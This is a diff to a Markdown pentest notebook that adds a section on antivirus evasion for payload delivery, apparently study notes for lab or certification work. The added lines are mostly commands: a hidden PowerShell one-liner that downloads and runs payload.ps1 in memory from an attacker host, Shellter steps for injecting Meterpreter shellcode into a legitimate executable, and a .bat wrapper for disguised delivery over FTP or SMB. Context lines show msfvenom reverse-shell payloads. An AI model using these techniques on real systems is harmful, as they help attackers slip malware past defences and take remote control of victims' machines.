@@ -213,6 +213,48 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe 
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o met.exe
 ```
 
+#### Step 2b: AV Evasion (When AV Is Blocking Direct Payloads)
+
+> Full walkthrough (VirusTotal detection, in-memory PowerShell injection, Shellter PE injection, .bat wrappers, FTP delivery): [[Antivirus Evasion]]
+
+When a raw `.exe` gets flagged, try these in order of least setup required:
+
+**Option 1: PowerShell in-memory injection (no disk write, bypasses signature-based AV)**
+```powershell
+# Kali: serve the payload script
+python3 -m http.server 80
+
+# Victim runs this -- payload fetched and executed entirely in RAM, nothing written to disk
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<kali_ip>/payload.ps1')"
+```
+Flag-by-flag breakdown: [[Antivirus Evasion (Breakdowns)#The PowerShell AV-bypass flags|Command Breakdowns]].
+
+**Option 2: Shellter PE injection (shellcode injected into a legitimate 32-bit PE)**
+```bash
+# Prereq (first time on Kali)
+sudo dpkg --add-architecture i386 && sudo apt update && sudo apt -y install wine32:i386
+rm -rf ~/.wine && WINEARCH=win32 wineboot    # reset Wine prefix to 32-bit
+
+# Verify host PE is 32-bit before injecting
+file target.exe    # must say PE32, not PE32+
+
+# Run Shellter interactively
+shellter
+# → A (Auto), PE path, Stealth Mode Y, L (listed payloads), index 1 (Meterpreter [stager]) or 5 (shell [stager])
+```
+If the payload shows `[stager]` in the menu: use msfconsole `multi/handler` not nc. [[Shells & Payloads (Decision Tree)#Shellter payload menu shows stager|Decision Tree]]. Full commands: [[Shells & Payloads#Shellter PE Injection|Command Appendix]].
+
+**Option 3: .bat wrapper (same in-memory IEX, delivered as a double-clickable file)**
+```bat
+@echo off
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<kali_ip>/payload.ps1')"
+```
+Deliver via FTP, SMB share, or any writable path the victim can execute. FTP delivery syntax (active mode, explicit remote filename): [[Shells & Payloads#FTP Active-Mode Payload Delivery|Command Appendix]].
+
+#### Tags: #AntivirusEvasion #Shellter #PowerShellInjection #BatWrapper #InMemory #PEInjection
+
+---
+
 #### Step 3: File Transfer
 ```powershell
 # PowerShell
